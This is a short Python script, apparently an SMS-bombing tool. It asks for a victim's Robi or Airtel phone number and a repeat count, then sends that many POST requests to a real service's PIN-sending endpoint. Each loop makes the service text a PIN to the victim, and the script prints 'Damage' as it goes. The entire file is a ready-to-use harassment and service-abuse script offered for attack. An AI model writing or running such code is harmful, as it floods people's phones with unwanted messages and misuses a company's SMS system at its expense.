import requests
from requests.structures import CaseInsensitiveDict


number  = str(input("       [>] EnTer yOur aTTack RoBi/AirTeL NumBer: "))

amount = int(input("        [>] CHoiCe YOur PiiN AmOunT : "))

url = "https://api.meenaclick.com/api/front/sms/send/pin?'"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "cell_phone="+number

for i in range (amount):
	
	requests.post(url,headers=headers, data = data)
	print(str (i+1)+" Damage \n")
